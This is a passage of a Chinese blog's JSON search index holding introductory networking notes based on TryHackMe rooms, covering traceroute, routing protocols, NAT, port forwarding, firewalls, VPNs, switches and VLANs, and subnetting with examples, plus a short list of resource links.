之间路径上路由器的结果。部分路由器未响应（即丢弃数据包且不返回任何ICMP消息）；属于我们ISP的路由器可能会响应，并暴露其私有IP地址。另一些路由器则会返回公有IP地址，从而允许我们通过域名查询推断其地理位置。此外，ICMP超时消息（Time Exceeded）可能被拦截，导致无法到达本机。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 user@TryHackMe$ traceroute example.com traceroute to example.com (93.184.215.14), 30 hops max, 60 byte packets 1 _gateway (192.168.66.1) 4.414 ms 4.342 ms 4.320 ms 2 192.168.11.1 (192.168.11.1) 5.849 ms 5.830 ms 5.811 ms 3 100.104.0.1 (100.104.0.1) 11.130 ms 11.111 ms 11.093 ms 4 10.149.1.45 (10.149.1.45) 6.156 ms 6.138 ms 6.120 ms 5 * * * 6 * * * 7 * * * 8 172.16.48.1 (172.16.48.1) 5.667 ms 8.165 ms 6.861 ms 9 ae81.edge4.Marseille1.Level3.net (212.73.201.45) 50.811 ms 52.857 ms 213.242.116.233 (213.242.116.233) 52.798 ms 10 NTT-level3-Marseille1.Level3.net (4.68.68.150) 93.351 ms 79.897 ms 79.804 ms 11 ae-9.r20.parsfr04.fr.bb.gin.ntt.net (129.250.3.38) 62.935 ms 62.908 ms 64.313 ms 12 ae-14.r21.nwrknj03.us.bb.gin.ntt.net (129.250.4.194) 141.816 ms 141.782 ms 141.757 ms 13 ae-1.a02.nycmny17.us.bb.gin.ntt.net (129.250.3.17) 145.786 ms ae-1.a03.nycmny17.us.bb.gin.ntt.net (129.250.3.128) 141.701 ms 147.586 ms 14 ce-0-3-0.a02.nycmny17.us.ce.gin.ntt.net (128.241.1.14) 148.692 ms ce-3-3-0.a03.nycmny17.us.ce.gin.ntt.net (128.241.1.90) 141.615 ms ce-0-3-0.a02.nycmny17.us.ce.gin.ntt.net (128.241.1.14) 148.168 ms 15 ae-66.core1.nyd.edgecastcdn.net (152.195.69.133) 141.100 ms ae-65.core1.nyd.edgecastcdn.net (152.195.68.133) 140.360 ms ae-66.core1.nyd.edgecastcdn.net (152.195.69.133) 140.638 ms 16 93.184.215.14 (93.184.215.14) 140.574 ms 140.543 ms 140.514 ms 17 93.184.215.14 (93.184.215.14) 140.488 ms 139.397 ms 141.854 ms 当我们重新运行命令时，遍历的路由可能会发生变化。\nRouting 路由 考虑下面显示的网络图。它只有三个网络;但是，Internet 如何确定如何将数据包从网络 1 传送到网络 2 或网络 3？虽然这是一个过于简化的图表，但我们需要一些算法来弄清楚如何将网络 1 连接到网络 2 和网络 3，反之亦然。\n让我们考虑一个更详细的图表。互联网将是数百万台路由器和数十亿台设备。下面的网络是 Internet 的一小部分。移动用户可以访问 Web 服务器;但是，要实现此目的，路径上的每个路由器都需要通过适当的链路发送数据包。显然，连接移动用户和 Web 服务器的路径不止一条，即路由。我们需要一个路由算法，让路由器弄清楚要使用哪个链路。\n路由算法超出了这个房间的范围;但是，我们将简要介绍一些路由协议，以便您熟悉它们的名称：\n**OSPF （Open Shortest Path First）：**OSPF 是一种路由协议，允许路由器共享有关网络拓扑的信息并计算最有效的数据传输路径。它通过让路由器交换有关其连接的链接和网络状态的更新来实现这一点。这样，每个路由器都有一个完整的网络地图，并且可以确定到达任何目的地的最佳路线。 **EIGRP（增强型内部网关路由协议）：**EIGRP 是 Cisco 专有的路由协议，它结合了不同路由算法的各个方面。它允许路由器共享有关它们可以访问的网络以及与这些路由相关的成本（如带宽或延迟）的信息。然后，路由器使用此信息来选择最有效的数据传输路径。 **BGP（边界网关协议）：**BGP 是 Internet 上使用的主要路由协议。它允许不同的网络（如 Internet 服务提供商的网络）交换路由信息并建立数据在这些网络之间传输的路径。BGP 有助于确保数据可以通过 Internet 高效路由，即使在遍历多个网络时也是如此。 **RIP（路由信息协议）：**RIP 是一种简单的路由协议，通常用于小型网络。运行 RIP 的路由器共享有关它们可以访问的网络以及到达该网络所需的跃点（路由器）数的信息。因此，每个路由器都会根据此信息构建一个路由表，选择跳数最少的路由来到达每个目的地。 NAT 网络地址转换 正如 Networking Concepts 会议室中所讨论的，我们计算出 IPv4 最多可以支持 40 亿台设备。随着连接到 Internet 的设备数量的增加，从计算机和智能手机到安全摄像头和洗衣机，很明显 IPv4 地址空间将很快耗尽。解决耗尽问题的一种解决方案是网络地址转换 （NAT）。\nNAT（网络地址转换）的核心思想是通过一个公网IP地址为多个私有IP地址提供互联网访问能力。例如，若某公司有20台计算机需要联网，无需为每台设备分配一个公网IP地址（共20个），只需使用一个公网IP地址即可让所有设备接入互联网。（技术细节补充：严格来说，IP地址数量通常以2的幂次方为单位分配。因此，更准确的表述是——使用NAT时，您只需预留2个公网IP地址，而非原本所需的32个，从而节省了30个公网IP地址。）\n与路由不同，路由是将数据包路由到目标主机的自然方式，支持 NAT 的路由器必须找到一种方法来跟踪正在进行的连接。因此，支持 NAT 的路由器维护一个表，用于在内部和外部网络之间转换网络地址。通常，内部网络将使用私有 IP 地址范围，而外部网络将使用公共 IP 地址。\n在下图中，多个设备通过支持 NAT 的路由器访问 Internet。路由器维护一个表，该表将内部 IP 地址和端口号与其外部 IP 地址和端口号进行映射。例如，笔记本电脑可能会与某些 Web 服务器建立连接。从笔记本电脑的角度来看，连接是从其 IP 地址 192.168.0.129 从 TCP 源端口号 15401 发起的;但是，Web 服务器将看到与 212.3.4.5 和 TCP 端口号 19273 建立的连接相同的连接，如转换表中所示。路由器无缝地执行此地址转换。\n","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/easter-3270234.jpg","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"网络基础知识"},{"content":"网络扩展 端口转发 端口转发是将应用程序和服务连接到 Internet 的重要组件。如果没有端口转发，应用程序和服务（如 Web 服务器）只能用于同一直接网络内的设备。\n以下面的网络为例。在此网络中，IP 地址为“192.168.1.10”的服务器在端口 80 上运行 Web 服务器。只有此网络上的其他两台计算机能够访问它（这称为 Intranet）。\n如果管理员希望公众可以访问网站（使用 Internet），则必须实施端口转发，如下图所示：\n通过这种设计，网络 #2 现在将能够使用网络 #1 的公共 IP 地址 （82.62.51.70） 访问在网络 #1 上运行的 Web 服务器。\n很容易将端口转发与防火墙的行为混淆（我们将在后面的任务中讨论这项技术）。但是，在这个阶段，只需了解端口转发会打开特定端口（回想一下数据包的工作原理）。相比之下，防火墙确定流量是否可以通过这些端口传输（即使这些端口通过端口转发打开）。\n端口转发在网络的路由器上配置。\n防火墙基础 防火墙是网络中负责确定允许哪些流量进出的设备。将防火墙视为网络的边界安全。管理员可以根据多种因素配置防火墙以允许 或 拒绝 流量进入或退出网络，例如：\n流量来自哪里？（是否告知防火墙接受/拒绝来自特定网络的流量？） 流量去哪里了？（是否告知防火墙接受/拒绝发往特定网络的流量？） 流量用于哪个端口？（是否已告知防火墙仅接受/拒绝发往端口 80 的流量？） 流量使用什么协议？（是否告知防火墙接受/拒绝 UDP、TCP 或两者兼而有之的流量？） 防火墙执行数据包检查以确定这些问题的答案。\n防火墙有各种形状和大小。从可以处理大量数据的专用硬件（通常位于企业等大型网络中）到住宅路由器（如您家中）或 Snort 等软件，防火墙可分为 2 到 5 类。\n我们将在下表中介绍防火墙的两大主要类别：\n防火墙类别 描述 Stateful 状态 这种类型的防火墙使用来自连接的全部信息;此防火墙不是检查单个数据包，而是根据整个连接确定设备的行为。与无状态防火墙相比，这种防火墙类型会消耗许多资源，因为决策是动态的。例如， 防火墙可能允许 TCP 握手的第一部分，但稍后会失败。如果来自主机的连接错误，它将阻止整个设备。 Stateless 无状态 此防火墙类型使用一组静态规则来确定单个数据包是否可接受。例如，发送错误数据包的设备并不一定意味着整个设备随后被阻止。虽然这些防火墙使用的资源比其他防火墙少得多，但它们要笨得多。例如，这些防火墙仅对其中定义的规则有效。如果规则不完全匹配，它实际上就毫无用处。 但是，当从一组主机接收大量流量（例如分布式拒绝服务攻击）时，这些防火墙非常有用 防火墙练习 恶意流量被标记为红色数据包。合法流量是标记为绿色的数据包。您需要阻止的协议是端口 80。 配置防火墙 ，防止恶意数据包到达 Web 服务器 203.0.110.1。\nVPN基础知识 A Virtual Private Network（或 简称 VPN ）是一种技术，它允许不同网络上的设备通过通过 Internet 在彼此之间创建专用路径（称为隧道）来安全地通信。在此隧道中连接的设备将形成自己的专用网络。\n例如，只有同一网络（例如企业内部）内的设备才能直接通信。但是，VPN 允许连接两个办公室。让我们看下图，其中有三个网络：\nNetwork #1 (Office #1) Network #2 (Office #2) Network #3 （通过 VPN 连接的两台设备） 连接在网络 #3 上的设备仍然是网络 #1 和网络 #2 的一部分，但也共同形成一个专用网络（网络 #3），只有通过此 VPN 连接的设备才能通过该网络进行通信。\n让我们在下表中介绍 VPN 提供的其他一些好处：\n效益 描述 允许连接不同地理位置的网络。 例如，拥有多个办事处的企业会发现 VPN 是有益的，因为这意味着可以从另一个办公室访问服务器/基础设施等资源。 提供隐私。 VPN 技术使用加密来保护数据。这意味着它只能在发送它的设备和目的地之间被理解，这意味着数据不易被嗅探。这种加密在网络不提供加密的公共 WiFi 的地方很有用。您可以使用 VPN 来保护您的流量不被其他人查看。 提供匿名 记者和活动家依靠 VPN 在言论自由受到控制的国家/地区安全地报道全球问题。通常，您的 ISP 和其他中介可以查看您的流量，因此可以对其进行跟踪。VPN 提供的匿名性级别仅与网络上其他设备尊重隐私的方式一样多。例如，在这方面，记录您所有数据/历史记录的 VPN 与不使用 VPN 本质上相同。 TryHackMe 使用 VPN 将您连接到我们易受攻击的机器，而无需在 Internet 上直接访问它们！这意味着：\n您可以安全地与我们的机器交互 服务提供商（如 ISP）不会认为您正在攻击 Internet 上的另一台计算机（这可能违反服务条款） VPN 为 TryHackMe 提供安全性，因为无法使用 Internet 访问易受攻击的机器。 VPN 技术多年来一直在改进。让我们在下面探索一些现有的 VPN 技术：\n**VPN Technology ** 描述 PPP PPTP 使用此技术（如下所述）来允许身份验证并提供数据加密。VPN 通过使用私钥和公有证书（类似于 SSH）来工作。私钥和证书必须匹配才能连接。该技术无法自行离开网络（不可路由）。 PPTP （PPTP） 是允许来自 PPP 的数据传输和离开网络的技术。PPTP 非常易于设置，并且大多数设备都支持。但是，与其他选择相比，它的加密较弱。 IPSec 协议安全 （IPsec） 使用现有的 Internet Protocol （IP） 框架对数据进行加密。与其他选择相比，IPSec 很难设置;但是，如果成功，它拥有强大的加密功能，并且许多设备也支持它。 LAN 联网设备 什么是路由器 路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）\n路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。路由器在 OSI 模型的第 3 层运行。它们通常具有交互式界面（例如网站或控制台），允许管理员配置各种规则，例如端口转发或防火墙。\n当设备通过许多路径连接时，路由非常有用，例如在下面的示例图中，其中采用最佳路径：\n路由器是专用设备，不执行与交换机相同的功能。\n我们可以看到，计算机 A 的网络通过中间的两个路由器连接到计算机 B 的网络。问题是：将采取什么道路？不同的协议将决定应该采取什么路径，但因素包括：\n最短的路径是什么？ 什么路径最可靠？ 哪条路径具有更快的介质（例如铜缆或光纤）？ 什么是交换机 交换机是一种专用网络设备，负责提供连接到多个设备的方法。交换机可以使用以太网电缆为许多设备（从 3 到 63 个）提供服务。\n交换机可以在 OSI 模型的第 2 层和第 3 层运行。但是，这些是排他性的，因为第 2 层交换机不能在第 3 层运行。\n以下图中的第 2 层交换机为例。这些交换机将使用帧的 MAC 地址将帧（请记住，这些不再是数据包，因为 IP 协议已被剥离）转发到连接的设备上。\n这些交换机仅负责将帧发送到正确的设备。\n现在，让我们来看看第 3 层交换机。这些交换机比第 2 层更复杂，因为它们可以执行 路由器的一些职责。也就是说，这些交换机将帧发送到设备（就像第 2 层一样），并使用 IP 协议将数据包路由到其他设备。\n让我们看一下下图中的第 3 层交换机。我们可以看到有两个 IP 地址：\n192.168.1.1 192.168.2.1 一种称为 VLAN （Virtual Local Area Network） 的技术允许对网络内的特定设备进行虚拟拆分。这种拆分意味着他们都可以从 Internet 连接等中受益，但被单独处理。这种网络分离提供了安全性，因为这意味着现有的规则决定了特定设备如何相互通信。这种分离如下图所示：\n在上图的上下文中，“销售部门”和“会计部门”将能够访问 Internet，但无法相互通信（尽管它们连接到同一交换机）。\n","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/waves-8905720.png","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%89%A9%E5%B1%95/","title":"网络扩展"},{"content":"子网与子网掩码 子网和子网掩码是网络中的核心概念，用来划分和管理 IP 地址。我们可以通过一个生活化的例子来理解它们：\n🌍 类比：城市、街道和门牌号 假设整个城市是一个大网络（比如 192.168.1.0/24），所有房子（设备）的地址都类似 192.168.1.X。但随着城市扩张，直接管理所有地址变得困难。于是，市长（网络管理员）决定将城市划分为几个区（子网），每个区有独立的街道和门牌号。\n子网（Subnet）： 就像把城市划分为多个区（例如“东区”、“西区”），每个区内的地址范围更小、更易管理。\n原城市地址：192.168.1.0 ~ 192.168.1.255（共 256 个地址） 划分为两个子网： 东区：192.168.1.0 ~ 192.168.1.127（128 个地址） 西区：192.168.1.128 ~ 192.168.1.255（128 个地址） 子网掩码（Subnet Mask）： 像是一把标尺，用来区分“区号”和“门牌号”。\n原城市的子网掩码：255.255.255.0（二进制：11111111.11111111.11111111.00000000）\n划分子网后的子网掩码：\n1 255.255.255.128 （二进制：\n1 11111111.11111111.11111111.10000000 ）\n前 25 位表示“区号”（如东区或西区），后 7 位表示区内的“门牌号”。 🔍 技术解释 子网（Subnet）：\n将一个大网络（如 192.168.1.0/24）分割成多个小网络，便于管理、优化流量、提高安全性。 每个子网有自己的地址范围，例如： 子网1：192.168.1.0/25（地址范围：0 ~ 127） 子网2：192.168.1.128/25（地址范围：128 ~ 255） 子网掩码（Subnet Mask）：\n一个 32 位的二进制数字，与 IP 地址配合使用，用于标识网络部分和主机部分。\n规则\r：\r- `1` 的位表示网络地址（不可变），`0` 的位表示主机地址（可变）。\r- 例如，\r```\r255.255.255.0\r```\r（二进制\r```\r11111111.11111111.11111111.00000000\r```\r）表示：\r- 前 24 位是网络地址，后 8 位是主机地址（可容纳 `2^8 - 2 = 254` 台设备，减去的 2 是网络地址和广播地址）。\r🌰 实际例子 假设公司有一个局域网 192.168.1.0/24，需要为三个部门（财务部、技术部、市场部）划分子网：\n划分子网：\n使用子网掩码\n1 255.255.255.192 （二进制\n1 11111111.11111111.11111111.11000000 ，即\n1 /26 ），将原网络划分为 4 个子网：\n子网1：192.168.1.0/26（地址：0 ~ 63） 子网2：192.168.1.64/26（地址：64 ~ 127） 子网3：192.168.1.128/26（地址：128 ~ 191） 子网4：192.168.1.192/26（地址：192 ~ 255） 分配子网：\n财务部用子网1，技术部用子网2，市场部用子网3，剩余子网4备用。 优势：\n各部门流量互不干扰，安全性提升（可设置防火墙规则隔离子网）。 广播范围缩小，网络性能优化。 🔧 如何计算子网掩码？ 确定需求： 需要多少子网？每个子网需要多少主机？ 例如：需要 4 个子网，每个子网至少 50 台设备。 选择子网掩码： 主机部分至少需要 6 位（2^6 - 2 = 62 台），网络部分则为 26 位（32 - 6 = 26）。 子网掩码为 255.255.255.192（即 /26）。 总结 子网是网络的分区，就像城市划分成区；子网掩码是划分规则，决定如何分配地址。 划分子网能提升网络效率、安全性和管理便捷性。 实际应用中，子网掩码的位数（如 /24、/26）直接决定了子网大小和数量。 ","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/pattern-8801850.png","permalink":"https://Yerucrem.github.io/p/%E5%AD%90%E7%BD%91%E4%B8%8E%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/","title":"子网与子网掩码"},{"content":"Pixabay:https://pixabay.com/zh/\nemoji:https://www.emojiall.com/zh-hans\nCyberChef:https://gchq.github.io/CyberChef/\nEXP:https://www.exploit-db.com/\n","date":"2025-01-01T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background-1311251.jpg","permalink":"https://Yerucrem.github.io/p/%E8%B5%84%E6%BA%90%E8%81%9A%E5%90%88/","title":"资源聚合"},{"content":"TEST ","date":"2024-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/01DFA140B78CF068F9CB2ACC01C76E40.jpg","permalink":"https://Yerucrem.github.io/p/%E6%B5%8B%E8%AF%95/","title":"测试"}]